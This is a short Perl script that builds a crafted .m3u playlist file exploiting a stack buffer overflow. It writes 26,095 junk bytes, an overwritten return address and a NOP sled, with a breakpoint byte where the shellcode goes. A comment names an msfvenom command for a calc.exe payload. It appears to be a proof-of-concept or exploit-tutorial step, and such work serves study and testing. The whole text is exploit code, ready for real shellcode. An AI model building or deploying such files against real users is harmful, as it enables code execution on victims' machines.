my $file= "eipcrash.m3u";
my $junk= "\x41" x26095;
my $eip= pack('V',0x01ccf23a);

my $shellcode= "\x90" x25;

#msfvenom -p windows/exec CMD=calc.exe -b "x00" -f perl
$shellcode = $shellcode . "\xcc";
$shellcode = $shellcode . "\x90";






open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
